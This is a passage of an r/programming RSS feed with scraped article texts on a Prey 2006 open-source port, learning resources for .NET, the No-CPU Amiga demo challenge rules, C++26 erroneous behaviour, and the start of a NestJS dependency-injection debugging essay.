href='https://www.reddit.com/r/programming/comments/1nb3b31/how_your_code_really_controls_hardware/'>Post permalink</a></p></section><section class='embedded-media'><iframe width="356" height="200" src="https://www.youtube.com/embed/sp3mMwo3PO0?feature=oembed&enablejsapi=1" frameborder="0" allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture; web-share" referrerpolicy="strict-origin-when-cross-origin" allowfullscreen title="How Your Code Really Controls Hardware"></iframe></section>]]></description><pubDate>Mon, 08 Sep 2025 01:34:39 +0530</pubDate></item><item><link>https://krispy-the-goat.itch.io/prey-2006</link><title>Prey 2006 project to create open-source FPS game port by integrating its codebase with Doom 3 GPL release (krispy-the-goat.itch.io)</title><guid isPermaLink="true">https://www.reddit.com/r/programming/comments/1nax3re/prey_2006_project_to_create_opensource_fps_game/</guid><comments>https://www.reddit.com/r/programming/comments/1nax3re/prey_2006_project_to_create_opensource_fps_game/</comments><description><![CDATA[<section class='reading-time-and-permalink'><p>Reading time: 2 min | <a href='https://www.reddit.com/r/programming/comments/1nax3re/prey_2006_project_to_create_opensource_fps_game/'>Post permalink</a></p></section><section class='preview-image'><img src='https://img.itch.zone/aW1nLzE4NzcxNzQ2LnBuZw==/original/fp8nmE.png' /></section><section class='parsed-content'><div><h4>Introduction</h4><p>This project is a code integration of the Prey 2006 SDK against the Doom 3 GPL codebase. This means this includes new engine side features that were in the Prey 2006 engine, and some adjustments to the Prey 2006 SDK code.</p><p>This runs in a semi vanilla&nbsp;<a href="https://github.com/dhewm/dhewm3/releases/tag/1.5.4">Dhewm3 v1.5.4</a> fork that specifically removes imgui, soft particles and joystick support for the time being.</p><h4>How To Run</h4><p>You <strong>MUST&nbsp;</strong>source your own legal copy of Prey (2006) to run this, i wouldn't provide any links for this.</p><h5>Why Release in a premature state?</h5><p>I'm releasing this build <strong><em>as-is with limit or lack thereof support</em></strong>, in hopes of attracting people that loves about this game and its, and since my lack of knowledge limits severely.</p><p>The source code of this project would be linked at the end of this but to summarize the current issues of this here are:</p><ol><li>Death Walk a key feature of Prey is missing meaning that in some parts you need to do noclip.</li><li>Spirit Walk visual are broken (in parts where spirit walking is mandatory noclip may or may not be needed)<br> </li><li>Multiplayer may work but has not been tested.<br> </li></ol> <h4>Credits</h4><p>This fork wouldn't be possible by the 3 previous attempts of porting Prey before me:</p><ul><li><a href="https://github.com/jmarshall23/PreyDoom">PreyDoom - By jmarshall23</a></li><li><a href="https://github.com/neitey/PreyVR">PreyVR - By neitey</a><br> </li><li><a href="https://github.com/glKarin/com.n0n3m4.diii4a">com.n0n3m4.diii4a - By GLKarin</a></li><li><a href="https://github.com/dhewm/dhewm3">dhewm3 - By dhew</a></li></ul> <h4>Conclusion</h4><p>Has i state before, here is the link for the&nbsp;&nbsp;<a href="https://github.com/FriskTheFallenHuman/Prey2006">Source Code</a>&nbsp;of this project, and here is the link for reporting&nbsp;<a href="https://github.com/FriskTheFallenHuman/Prey2006/issues">Issues</a> but like i say before support may or may not be limited.<span></span><br></p></div></section>]]></description><pubDate>Sun, 07 Sep 2025 21:35:18 +0530</pubDate></item><item><link>https://mijailovic.net/2025/09/07/dotnet/</link><title>How to (actually) become an expert in .NET (mijailovic.net)</title><guid isPermaLink="true">https://www.reddit.com/r/programming/comments/1nap35c/how_to_actually_become_an_expert_in_net/</guid><comments>https://www.reddit.com/r/programming/comments/1nap35c/how_to_actually_become_an_expert_in_net/</comments><description><![CDATA[<section class='reading-time-and-permalink'><p>Reading time: 12 min | <a href='https://www.reddit.com/r/programming/comments/1nap35c/how_to_actually_become_an_expert_in_net/'>Post permalink</a></p></section><section class='preview-image'><img src='https://mijailovic.net/assets/img/2025-09-07-dotnet.png' /></section><section class='parsed-content'><div><article><div><p>The influencers want you to think that you must learn a gazillion different technologies to become a successful .NET developer. These days, the internet is full of .NET &ldquo;roadmaps&rdquo; that include everything but the kitchen sink: Azure, AWS, Redis, Docker, Postgres, GraphQL, gRPC, Dapper, ELK stack, CQRS, you name it.</p><p>There are several problems with this trend. One is that it generates fear and anxiety that it&rsquo;s impossible to become a good developer, because the list of things you &ldquo;must&rdquo; know is growing by the day. It might also lead you to focus on the wrong things and waste the time you could spend <em>actually</em> improving your .NET skills. The other problem is that these claims are objectively wrong. I&rsquo;ve been using .NET for over 15 years, 6 of which I&rsquo;ve spent working for Microsoft, where I&rsquo;m currently a principal engineer. If I were to be judged by what influencers call minimal .NET knowledge, I wouldn&rsquo;t even qualify as a junior developer.</p><p>I&rsquo;m not being funny or anything, but shouldn&rsquo;t you learn Redis only if you, like, work with Redis? You don&rsquo;t have to learn GraphQL to be a good .NET developer, but you should absolutely learn how memory management works. Kafka and RabbitMQ are optional&mdash;knowing how async/await works is essential. Don&rsquo;t get me wrong: these are all cool technologies and it&rsquo;s great to be familiar with them. But most technologies can be easily learned when there is a real need. What truly matters is mastering the knowledge of .NET itself, and that&rsquo;s what this post is all about.</p><h2>How to read this guide</h2><p>I&rsquo;m going to share with you the list of resources that will help you to become a great .NET developer. Even though I tried to summarize only the essentials, it&rsquo;s still a lot of information. Mastering every area I&rsquo;m gonna talk about will take you months or even years, so don&rsquo;t get discouraged early on. It&rsquo;s impossible to learn everything immediately&mdash;what matters is expanding your expertise slowly, topic by topic.</p><p>You can learn the topics I presented in any order. For example, if your job requires you to write high-performance code, you could start your learning journey by focusing on the performance and tools sections. Or if you want to broaden your C# knowledge first, you could start with <em>C# learning resources</em>. If you are not sure, <em>Exploring .NET internals</em> is the best place to get started.</p><p>Before we start: if you are an absolute .NET beginner, this post is probably not for you. If you want to learn C#, I recommend watching the <a href="https://www.youtube.com/playlist?list=PLdo4fOcmZ0oULFjxrOagaERVAMbmG20Xe">C# for Beginners</a> YouTube video course first. Now let&rsquo;s get started.</p><h2>Books</h2><p>If you had asked me ten years ago what&rsquo;s the best way to learn .NET, I would have probably told you to read CLR via C#. Although it&rsquo;s still one of my favorite technical books ever, .NET has changed so much since the book came out that I can no longer recommend it as the most efficient way to master .NET. In fact, I think that the quality of technical books has been decreasing over the years, so there are fewer and fewer books that I would consider must-reads.</p><p>Having said that, if you like reading books, there are still some excellent ones out there! If I had to recommend only one .NET book, it would be <a href="https://www.ebooks.com/en-cz/book/210046474/framework-design-guidelines/krzysztof-cwalina/">Framework Design Guidelines</a>. Written by .NET architects, it&rsquo;s a collection of conventions and best practices for writing idiomatic .NET code. What elevates this book from the rest is that it&rsquo;s full of comments and annotations from .NET legends such as Jeffrey Richter, Joe Duffy, Rico Mariani, and Vance Morrison, in which they explain not only the best practices, but also the reasoning behind them.</p><p>Another book I loved is <a href="https://www.writinghighperf.net/">Writing High-Performance .NET Code</a>. When it came out in 2018, it was the most comprehensive guide to .NET performance. The only thing that&rsquo;s holding me back from giving it my seal of approval now is that I haven&rsquo;t re-read it since, so I&rsquo;m not sure if it still holds up today (my guess is that it&rsquo;s still relevant).</p><h2>Exploring .NET internals</h2><p>I think the key to becoming a .NET expert is learning how things work under the hood. Gaining a deep understanding of async/await, string interpolation, spans, and garbage collection will give you superpowers and help you stand out from the crowd. The .NET team regularly publishes deep dives on their blog (well, it&rsquo;s just Stephen Toub in most cases), and they are great, without exception. Here are the ones I consider the most important:</p><ul> <li><a href="https://devblogs.microsoft.com/dotnet/how-async-await-really-works/">How Async/Await Really Works in C#</a></li> <li><a href="https://devblogs.microsoft.com/dotnet/string-interpolation-in-c-10-and-net-6/">String Interpolation in C# 10 and .NET 6</a></li> <li><a href="https://devblogs.microsoft.com/dotnet/configureawait-faq/">ConfigureAwait FAQ</a></li> <li><a href="https://devblogs.microsoft.com/dotnet/an-introduction-to-system-threading-channels/">An Introduction to System.Threading.Channels</a></li> <li><a href="https://devblogs.microsoft.com/dotnet/understanding-the-whys-whats-and-whens-of-valuetask/">Understanding the Whys, Whats, and Whens of ValueTask</a></li> <li><a href="https://learn.microsoft.com/en-us/archive/msdn-magazine/2018/january/csharp-all-about-span-exploring-a-new-net-mainstay">All About Span: Exploring a New .NET Mainstay</a></li> </ul><p>If you prefer watching videos, <a href="https://www.youtube.com/playlist?list=PLdo4fOcmZ0oX8eqDkSw4hH9cSehrGgdr1">Deep .NET</a> is hands down the best collection of .NET deep dives on the internet. These videos cover the same topics as the blog posts I mentioned and even more, so they are definitely worth your time.</p><h2>C# learning resources</h2><p>Assuming you already know the basics of C#, progressing further is fairly straightforward. Whether you want to learn about the new C# features or just fill the gaps in your knowledge, you should check out the following pages:</p><ul> <li><a href="https://learn.microsoft.com/en-us/dotnet/csharp/whats-new/csharp-14">What&rsquo;s new in C# 14</a></li> <li><a href="https://learn.microsoft.com/en-us/dotnet/core/whats-new/dotnet-10/overview">What&rsquo;s new in .NET 10</a></li> </ul><p>These two articles describe the new features in the latest versions of C# and .NET, but I also recommend reading about all previous versions. Even if you are an experienced .NET developer, I think you will still learn something new.</p><h2>Staying up to date</h2><p>First of all, you don&rsquo;t need to know about every new runtime or language feature. You&rsquo;ll be perfectly fine even if you don&rsquo;t start using <code>readonly ref struct</code>, record types, or pattern matching right away. But I would still advise you to periodically check what&rsquo;s been going on in the .NET ecosystem. It&rsquo;s not necessary to do this on a weekly or even a monthly basis&mdash;doing this once a year should be more than enough.</p><p>Your main source of information should be the <a href="https://devblogs.microsoft.com/dotnet/">.NET blog</a> (other blogs often cherry-pick random pieces of information from official .NET posts). Not everything on the .NET blog is required reading, though. For me, the most illuminating posts are the ones that showcase the improvements in the latest .NET versions. My personal highlights are the following series:</p><ul> <li><a href="https://devblogs.microsoft.com/dotnet/performance-improvements-in-net-9/">Performance Improvements in .NET 9</a></li> <li><a href="https://devblogs.microsoft.com/dotnet/dotnet-9-networking-improvements/">.NET 9 Networking Improvements</a></li> <li><a href="https://devblogs.microsoft.com/dotnet/system-text-json-in-dotnet-9/">What&rsquo;s new in System.Text.Json in .NET 9</a></li> <li><a href="https://devblogs.microsoft.com/dotnet/file-io-improvements-in-dotnet-6/">File IO improvements in .NET 6</a></li> </ul><p>These are just the latest posts in the series&mdash;if you like them, I highly recommend reading the earlier posts in the series as well.</p><h2>Mastering the key libraries</h2><p>To be an effective .NET developer, it&rsquo;s more important to be proficient with the standard library than to be familiar with any specific external library. It&rsquo;s definitely worth learning the modern APIs for <a href="https://learn.microsoft.com/en-us/dotnet/standard/serialization/system-text-json/overview">JSON serialization and deserialization</a>. Learning how to use the HttpClient correctly is also essential&mdash;it seems obvious, but it&rsquo;s surprisingly tricky to get right. Here are my recommended articles about writing reliable networking code and avoiding common pitfalls:</p><ul> <li><a href="https://learn.microsoft.com/en-us/dotnet/fundamentals/networking/http/httpclient-guidelines">Guidelines for using HttpClient</a></li> <li><a href="https://learn.microsoft.com/en-us/dotnet/core/extensions/httpclient-factory">IHttpClientFactory with .NET</a></li> <li><a href="https://learn.microsoft.com/en-us/dotnet/core/resilience/http-resilience">Build resilient HTTP apps: Key development patterns</a></li> </ul><p>Outside the standard library, Newtonsoft.Json is still so widely used that it&rsquo;s very useful to at least know how to use it optimally <a href="https://www.newtonsoft.com/json/help/html/performance.htm">for performance</a>.</p><h2>Writing high-performance code</h2><p>Modern .NET is incredibly fast. In fact, I would say that high performance is one of its defining characteristics, so it pays off to understand how to take full advantage of the platform&rsquo;s high-performance features.</p><p>Stephen Toub&rsquo;s annual blog posts on <a href="https://devblogs.microsoft.com/dotnet/performance-improvements-in-net-9/">performance improvements in .NET</a> are among the most valuable resources for learning about .NET performance. Although they are published as blog posts, they really are books in disguise&mdash;the latest installment is more than 300 pages long. Unless you have unlimited free time, reading them end-to-end is next to impossible. My recommended way of consuming these posts is to scan through the topics and carefully read sections that pique your curiosity. What does that mean? If you are a compiler optimization geek, you might want to read sections about the latest JIT and PGO improvements. But if you are looking for practical knowledge you can apply immediately in your backend service, you could read sections about JSON and networking improvements.</p><p>Writing the fastest possible .NET code requires understanding how garbage collection works. The official documentation on <a href="https://learn.microsoft.com/en-us/dotnet/standard/garbage-collection/">garbage collection</a> is great: it&rsquo;s easy to read and very thorough. It will teach you how generations work, what is the large object heap, what are the differences between workstation and server garbage collection, and much more. But the definitive resource for mastering memory in .NET is the <a href="https://github.com/Maoni0/mem-doc/blob/master/doc/.NETMemoryPerformanceAnalysis.md">.NET Memory Performance Analysis</a> document written by Maoni Stephens, the .NET GC architect. It&rsquo;s the ultimate guide on how to approach memory performance analysis, and one of the best ways to deepen your understanding of how memory works in .NET.</p><p>Finally, it&rsquo;s important to learn how to measure performance correctly. <a href="https://benchmarkdotnet.org/">BenchmarkDotNet</a> is the undisputed king of .NET benchmarking and one of the few libraries everyone should be using. However, knowing how to use BenchmarkDotNet is just half of the story. Writing good benchmarks is not trivial and you can easily end up measuring the wrong thing. That&rsquo;s where the .NET team&rsquo;s <a href="https://github.com/dotnet/performance/blob/main/docs/microbenchmark-design-guidelines.md">Microbenchmark Design Guidelines</a> come into play. Think of this document as the missing BenchmarkDotNet manual&mdash;it goes beyond the syntax and teaches you how to design your benchmarks the right way. The <a href="https://github.com/dotnet/performance">.NET Performance</a> GitHub repository also contains all benchmarks for the .NET standard library. If you ever need inspiration when designing benchmarks, it&rsquo;s the best place to start.</p><p>I think everyone should have a decompiler in their toolbox. It&rsquo;s useful not only for reverse engineering, but also if you want to learn how seemingly simple statements like string interpolation work under the hood. The choice of decompiler is up to you&mdash;I personally prefer <a href="https://github.com/icsharpcode/ILSpy">ILSpy</a>.</p><p>One more indispensable tool is the <a href="https://source.dot.net/">.NET Source Browser</a>. I often use it to inspect how .NET classes are implemented and to find examples of good code design patterns. Even though the .NET source code is available in the <a href="https://github.com/dotnet/runtime">.NET Runtime</a> GitHub repository, the source browser makes navigation much easier.</p><p>.NET Framework&rsquo;s tooling was pretty bare-bones. In contrast, .NET Core comes with some fantastic <a href="https://learn.microsoft.com/en-us/dotnet/core/diagnostics/tools-overview">diagnostic tools</a>. You most likely won&rsquo;t use all of them in your day-to-day work, but in the right circumstances, they can be incredibly handy. At the very least, you should be aware of which tools exist. That way, if you ever need to collect a memory dump, you&rsquo;ll know you can use <a href="https://learn.microsoft.com/en-us/dotnet/core/diagnostics/dotnet-dump">dotnet-dump</a>. Or if you need to debug runaway threads, <a href="https://learn.microsoft.com/en-us/dotnet/core/diagnostics/dotnet-stack">dotnet-stack</a> can capture the stacks of all threads in a .NET process.</p><h2>Conclusion</h2><p>I hope this post was not too overwhelming! But my main message is simple: focus on having rock-solid fundamentals and you&rsquo;ll be golden. Hopefully, you also discovered some new and interesting learning resources. Let me know if I missed anything you consider essential!</p></div></article> </div></section>]]></description><pubDate>Sun, 07 Sep 2025 15:13:57 +0530</pubDate></item><item><link>https://github.com/askeksa/NoCpuChallenge</link><title>The No-CPU Amiga Demo Challenge (github.com)</title><guid isPermaLink="true">https://www.reddit.com/r/programming/comments/1namo4q/the_nocpu_amiga_demo_challenge/</guid><comments>https://www.reddit.com/r/programming/comments/1namo4q/the_nocpu_amiga_demo_challenge/</comments><description><![CDATA[<section class='reading-time-and-permalink'><p>Reading time: 6 min | <a href='https://www.reddit.com/r/programming/comments/1namo4q/the_nocpu_amiga_demo_challenge/'>Post permalink</a></p></section><section class='preview-image'><img src='https://opengraph.githubassets.com/00e4db5f825b16def79a43fd1c69a1386894629132ee3b573872491357d04977/askeksa/NoCpuChallenge' /></section><section class='parsed-content'><div><article><h2>The No-CPU Amiga Demo Challenge</h2><a href="https://github.com#the-no-cpu-amiga-demo-challenge"></a><p>This is an open challenge to create demos that run entirely on the Amiga custom chips without involving the CPU.</p><p>This repository contains the rules of the challenge and a <a href="https://github.com/askeksa/NoCpuChallenge/blob/main/runner">runner</a> application for launching no-CPU demos. This is intended as a standard specification of the no-CPU platform for demo competitions.</p><p>There will be a dedicated no-CPU Amiga demo competition at <a href="https://gerp.nu/"><strong>Gerp 2026</strong></a>, January 23-25, 2026. In addition, this is an ongoing challenge &mdash; an invitation to explore a different kind of demo platform.</p><p>An <a href="https://www.pouet.net/prod.php?which=104753">invitation demo</a> &mdash; itself a no-CPU demo &mdash; was released at <strong>Evoke 2025</strong>. The full source code for the demo is available <a href="https://github.com/askeksa/NoCpuDemo">here</a>.</p><p>Whenever you release a no-CPU demo, you are encouraged to write a comment about it on the <a href="https://github.com/askeksa/NoCpuChallenge/issues/1">demo announcement issue</a>.</p><p>There's also a <a href="https://github.com/askeksa/NoCpuChallenge/blob/main/faq.md">FAQ</a>.</p><h2>Background</h2><a href="https://github.com#background"></a><p>The Amiga custom chips (affectionately named <strong>Alice</strong>, <strong>Lisa</strong> and <strong>Paula</strong> in the AGA version of the chipset) were remarkably powerful for their time, enabling the Amiga computers &mdash; with their modestly-powered CPUs &mdash; to perform graphical and musical feats that required heavy computation on most contemporary platforms.</p><p>This challenge aims to discover just how powerful these chips really are by exploring what they can do completely on their own, without the CPU even telling them what to do.</p><p>There have been several demo competitions in the past with a technical theme. Examples include <a href="https://sommarhack.se/2024/compo.php#themed1">Atari zero bitplane</a>, <a href="https://sommarhack.se/2025/compo.php#themed">Atari mixed-resolution</a>, <a href="https://csdb.dk/event/?id=3003">C64 only sprites</a> and <a href="https://csdb.dk/event/?id=3021">C64 border only</a>. This is a similar idea for the Amiga &mdash; no CPU, custom chips only.</p><h2>Technical details</h2><a href="https://github.com#technical-details"></a><p>A no-CPU demo takes the form of a raw memory image that specifies the initial contents of chip memory. Together with the initial state of the hardware registers (specified below) this memory image fully defines the demo.</p><p>The memory image is loaded into memory by a <a href="https://github.com/askeksa/NoCpuChallenge/blob/main/runner">runner</a> application, which serves as the demo executable. You can use the runner as is or modify it to your liking, but in order to qualify as a no-CPU demo according to this challenge, your chip memory image has to work with the official runner (with the same behavior).</p><p>The maximum size of the chip memory image depends on the targeted Amiga chipset: 512k for OCS, 1MB for ECS (or OCS with ECS Agnus and 512k expansion, <a href="https://eab.abime.net/showthread.php?t=120351&amp;page=2">likely</a> the most common Amiga 500 configuration), and 2MB for AGA.</p><p>The audio filter is disabled. Since the filter is controlled via the CIA registers, which the copper does not have access to, the demo does not have the option of enabling the filter.</p><p>The initial hardware register contents are as follows. Registers with ECS/AGA specific bits are generally initialized to their OCS defaults. This makes it easier to make a demo targeting OCS without worrying about AGA compatibility (as long as you are not using incompatible features, such as the 7 bitplane trick).</p><markdown-accessiblity-table><table> <thead> <tr> <th>Register</th> <th>Address</th> <th>Value</th> <th>Comment</th> </tr> </thead> <tbody> <tr> <td>VPOSW</td> <td><code>$dff02a</code></td> <td><code>$8000</code></td> <td>Long frames</td> </tr> <tr> <td>COPCON</td> <td><code>$dff02e</code></td> <td><code>$0002</code></td> <td>Copper danger flag set</td> </tr> <tr> <td>COP1LC</td> <td><code>$dff080</code></td> <td><code>$000000</code></td> <td>Copper initially starts at address 0</td> </tr> <tr> <td>DMACON</td> <td><code>$dff096</code></td> <td><code>$87c0</code></td> <td>Bitplane, copper and blitter DMA enabled, sprite DMA disabled, Blitter Nasty set</td> </tr> <tr> <td>ADKCON</td> <td><code>$dff09e</code></td> <td><code>$xx00</code></td> <td>All modulation disabled</td> </tr> <tr> <td>BPLCON0</td> <td><code>$dff100</code></td> <td><code>$0200</code></td> <td>OCS default</td> </tr> <tr> <td>BPLCON1</td> <td><code>$dff102</code></td> <td><code>$0000</code></td> <td>OCS default</td> </tr> <tr> <td>BPLCON2</td> <td><code>$dff104</code></td> <td><code>$0024</code></td> <td>OCS default</td> </tr> <tr> <td>BPLCON3</td> <td><code>$dff106</code></td> <td><code>$0c00</code></td> <td>OCS default</td> </tr> <tr> <td>BPLCON4</td> <td><code>$dff10c</code></td> <td><code>$0011</code></td> <td>OCS default</td> </tr> <tr> <td>COLOR00</td> <td><code>$dff180</code></td> <td><code>$000</code></td> <td>Black background</td> </tr> <tr> <td>BEAMCON0</td> <td><code>$dff1dc</code></td> <td><code>$0020</code></td> <td>PAL</td> </tr> <tr> <td>FMODE</td> <td><code>$dff1fc</code></td> <td><code>$0000</code></td> <td>OCS default</td> </tr> </tbody> </table></markdown-accessiblity-table><p>The values of all other registers are undefined.</p><p>The demo can signal that it has ended by clearing the Blitter Nasty flag (i.e. by executing the copper instruction $0096,$0400). Depending on the hardware configuration, the runner may not actually be able to exit back to the OS, so the demo should still maintain a valid display.</p><h2>Feedback</h2><a href="https://github.com#feedback"></a><p>If you have questions or comments, you are welcome to <a href="https://github.com/askeksa/NoCpuChallenge/issues/new">open an issue</a>. I am particularly interested in feedback in these areas:</p><ul> <li>If there is something in the rules or the runner that you think puts undue limits on what no-CPU demos can do under this formalism.</li> <li>If you find a security hole in the runner sandbox, enabling a demo to reactivate the CPU.</li> </ul> </article></div></section>]]></description><pubDate>Sun, 07 Sep 2025 12:38:09 +0530</pubDate></item><item><link>https://www.sandordargo.com/blog/2025/02/05/cpp26-erroneous-behaviour</link><title>C++26: Erroneous Behaviour (sandordargo.com)</title><guid isPermaLink="true">https://www.reddit.com/r/programming/comments/1nag97e/c26_erroneous_behaviour/</guid><comments>https://www.reddit.com/r/programming/comments/1nag97e/c26_erroneous_behaviour/</comments><description><![CDATA[<section class='reading-time-and-permalink'><p>Reading time: 7 min | <a href='https://www.reddit.com/r/programming/comments/1nag97e/c26_erroneous_behaviour/'>Post permalink</a></p></section><section class='separator separator-before-parsed-content'><p>&nbsp;</p><hr><p>&nbsp;</p></section><section class='parsed-content'><div><p>If you pick a random talk at a C++ conference these days, there is a fair chance that the speaker will mention safety at least a couple of times. It&rsquo;s probably fine like that. The committee and the community must think about improving both the safety situation and the reputation of C++.</p><p>If you follow what&rsquo;s going on in this space, you are probably aware that people have different perspectives on safety. I think almost everybody finds it important, but they would solve the problem in their own way.</p><p>A big source of issues is certain manifestations of undefined behaviour. It affects both the safety and the stability of software. I remember that a few years ago when I was working on some services which had to support a 10x growth, one of the important points was to eliminate undefined behaviour as much as possible. One main point for us was to remove uninitialized variables which often lead to crashing services.</p><p>Thanks to <a href="https://www.open-std.org/jtc1/sc22/wg21/docs/papers/2024/p2795r5.html">P2795R5</a> by Thomas K&ouml;ppe, uninitialized reads won&rsquo;t be undefined behaviour anymore - starting from C++26. Instead, they will get a new behaviour called &ldquo;erroneous behaviour&rdquo;.</p><p>The great advantage of erroneous behaviour is that it will work just by recompiling existing code. It will diagnose where you forgot to initialize variables. You don&rsquo;t have to systematically go through your code and let&rsquo;s say declare everything as <code>auto</code> to make sure that every variable has an initialized value. Which you probably wouldn&rsquo;t do anyway.</p><p>But what is this new behaviour that on C++ Reference is even listed <a href="https://en.cppreference.com/w/cpp/language/ub">on the page of undefined behaviour</a>? It&rsquo;s well-defined, yet incorrect behaviour that compilers are <strong>recommended</strong> to diagnose. <em>Is recommended enough?!</em> Well, with the growing focus on safety, you can rest assured that an implementation that wouldn&rsquo;t diagnose erroneous behaviour would be soon out of the game.</p><p>Some compilers can already identify uninitialized reads - what nowadays falls under undefined behaviour. For example, clang and gcc with <code>-ftrivial-auto-var-init=zero</code> have already offered default initialization of variables with automatic storage duration. This means that the technique to identify these variables is already there. The only thing that makes this approach not practical is that you will not know which variables you failed to initialize.</p><p>Instead of default initialization, with erroneous behaviour, an uninitialized object will be initialized to an implementation-specific value. Reading such a value is a conceptual error that is recommended and encouraged to be diagnosed by the compiler. That might happen through warnings, run-time errors, etc.</p><div><p><code><table><tbody><tr><td><pre>1 2 3 4 </pre></td><td><pre><span>void</span> <span>foo</span><span>()</span> <span>{</span> <span>int</span> <span>d</span><span>;</span> <span>// d has an erroneous value</span> <span>bar</span><span>(</span><span>d</span><span>);</span> <span>// that's erroneous behaviour!</span> <span>}</span> </pre></td></tr></tbody></table></code></p></div><p>So looking at the above example, ideally <code>int d;</code> should be already diagnosed at compile-time as a warning. If it&rsquo;s ignored, at some point, <code>bar(d);</code> will have an effect during program execution, but it should be well-defined, unlike undefined behaviour where anything can happen.</p><blockquote><p>It&rsquo;s worth noting that undefined behaviour and having erroneous values is not possible in constant expressions. In other words, <code>constexpr</code> protects from it.</p></blockquote><p>Initializing an object to anything has a cost. What if you really want to avoid it and initialize the object later? Will you be able to still do it without getting the diagnostics? Sure! You just have to be deliberate about that. You cannot just leave values uninitialized by accident, you must mark them with C++26&rsquo;s new attribute, <code>[[indeterminiate]]</code>.</p><div><p><code><table><tbody><tr><td><pre>1 2 3 4 </pre></td><td><pre><span>void</span> <span>foo</span><span>()</span> <span>{</span> <span>int</span> <span>d</span> <span>[[</span><span>indeterminate</span><span>]];</span> <span>// d has an indeterminate value</span> <span>bar</span><span>(</span><span>d</span><span>);</span> <span>// that's undefined behaviour!</span> <span>}</span> </pre></td></tr></tbody></table></code></p></div><p>We must notice in the example, that <code>d</code> doesn&rsquo;t have an erroneous value anymore. Now its value is simply <a href="https://en.cppreference.com/w/cpp/language/attributes/indeterminate">indeterminate</a>. On the other hand, if we later use that variable still without initialization, it&rsquo;s undefined behaviour!</p><p>Above, we&rsquo;ve only talked about variables with automatic storage duration. That&rsquo;s not the only way to have uninitialized variables. Moreover, probably it&rsquo;s not even the main way, think about dynamic storage duration, think about pointers! Also, if any member is left uninitialized, the parent object&rsquo;s value will be considered either indeterminate or erroneous.</p><div><p><code><table><tbody><tr><td><pre>1 2 3 4 5 6 7 8 9 10 11 12 </pre></td><td><pre><span>struct</span> <span>S</span> <span>{</span> <span>S</span><span>()</span> <span>{}</span> <span>int</span> <span>num</span><span>;</span> <span>std</span><span>::</span><span>string</span> <span>text</span><span>;</span> <span>};</span> <span>int</span> <span>main</span><span>()</span> <span>{</span> <span>[[</span><span>indeterminate</span><span>]]</span> <span>S</span> <span>s1</span><span>;</span> <span>// indeterminate value</span> <span>std</span><span>::</span><span>cout</span> <span>&lt;&lt;</span> <span>s1</span><span>.</span><span>num</span> <span>&lt;&lt;</span> <span>'\n'</span> <span>// this is UB as s1.num is indeterminate</span> <span>S</span> <span>s2</span><span>;</span> <span>std</span><span>::</span><span>cout</span> <span>&lt;&lt;</span> <span>s2</span><span>.</span><span>num</span> <span>&lt;&lt;</span> <span>'\n'</span> <span>// this is still UB, s2.num is an erroneous value</span> <span>}</span> </pre></td></tr></tbody></table></code></p></div><p>Not only variables variables but function parameters can also be marked <code>[[indeterminate]]</code>.</p><div><p><code><table><tbody><tr><td><pre>1 2 3 4 5 6 7 8 9 10 11 </pre></td><td><pre><span>struct</span> <span>S</span> <span>{</span> <span>S</span><span>()</span> <span>{}</span> <span>int</span> <span>num</span><span>;</span> <span>std</span><span>::</span><span>string</span> <span>text</span><span>;</span> <span>};</span> <span>void</span> <span>foo</span><span>(</span><span>S</span> <span>s1</span> <span>[[</span><span>indeterminate</span><span>]],</span> <span>S</span> <span>s2</span><span>)</span> <span>{</span> <span>bar</span><span>(</span><span>s1</span><span>.</span><span>num</span><span>);</span> <span>// undefined behavior</span> <span>bar</span><span>(</span><span>s2</span><span>.</span><span>num</span><span>);</span> <span>// erroneous behavior</span> <span>}</span> </pre></td></tr></tbody></table></code></p></div><p>At the point of writing (January 2025), no compiler provides support for erroneous behaviour.</p><h2>Conclusion</h2><p>C++26 introduces erroneous behaviour in order to give well-defined, but incorrect behaviour for reading uninitialized values. Soon, compilers will be recommended to diagnose every occurrence of reads of uninitialized variables and function parameters.</p><p>Also, if something is not initialized at a given moment on purpose, you can mark it with the <code>[[indeterminate]]</code> attribute following the don&rsquo;t pay for what you don&rsquo;t need principle.</p><p>This new behaviour is a nice step forward in terms of C++&rsquo;s safety.</p><h2>Connect deeper</h2><p>If you liked this article, please</p><ul><li>hit on the like button,</li><li><a href="http://eepurl.com/gvcv1j">subscribe to my newsletter</a></li></ul></div><div class="gallery"><p><img src="https://c5.patreon.com/external/logo/become_a_patron_button.png"></p></div></section>]]></description><pubDate>Sun, 07 Sep 2025 06:43:43 +0530</pubDate></item><item><link>https://fastcode.io/2025/09/07/when-does-framework-sophistication-becomes-a-liability/</link><title>When Does Framework Sophistication Becomes a Liability? (fastcode.io)</title><guid isPermaLink="true">https://www.reddit.com/r/programming/comments/1na87fy/when_does_framework_sophistication_becomes_a/</guid><comments>https://www.reddit.com/r/programming/comments/1na87fy/when_does_framework_sophistication_becomes_a/</comments><description><![CDATA[<section class='reading-time-and-permalink'><p>Reading time: 36 min | <a href='https://www.reddit.com/r/programming/comments/1na87fy/when_does_framework_sophistication_becomes_a/'>Post permalink</a></p></section><section class='separator separator-after-permalink'><p>&nbsp;</p><hr><p>&nbsp;</p></section><section class='selftext'><!-- SC_OFF --><div class="md"><p>How a 72-hour debugging nightmare revealed the fundamental flaw in dependency injection frameworks and why strict typing matters more than sophisticated abstractions</p></div><!-- SC_ON --></section><section class='preview-image'><p>&nbsp;</p><img src='https://i0.wp.com/fastcode.io/wp-content/uploads/2025/09/debugging-nestjs-8003867.png?fit=1200%2C675&ssl=1' /></section><section class='parsed-content'><div><p>How a 72-hour debugging nightmare revealed the fundamental flaw in dependency injection frameworks and why strict typing matters more than sophisticated abstractions</p><h2>The Promise vs. The Reality</h2><p>TypeScript sold us a dream: JavaScript&rsquo;s flexibility with compile-time safety. NestJS took that dream further: enterprise patterns with type checking. For backend development, this seemed like the perfect combination, until a simple refactoring turned into a multi-day debugging marathon that exposed the fundamental contradiction at the heart of modern Node.js development.</p><p>The story begins with what should have been a straightforward task: refactor our notification system to route messages through a gateway instead of calling external APIs directly. Classic enterprise architecture, improve separation of concerns, centralize integrations, make everything more testable.</p><p>What followed was 72 hours of dependency injection archaeology, token naming inconsistencies, mock configuration hell, and ultimately discovering that a perfectly typed, fully tested, 93% code coverage system was completely broken in production.</p><p>This isn&rsquo;t just another &ldquo;framework bashing&rdquo; story. This is about a fundamental architectural mismatch between the tools we choose and the problems we&rsquo;re actually trying to solve. It&rsquo;s about how TypeScript&rsquo;s safety guarantees systematically break down in dependency injection frameworks, and why the choice between flexibility and correctness matters more than we admit.</p><h2>Day 1: The Dependency Injection Type Safety Illusion</h2><p>The 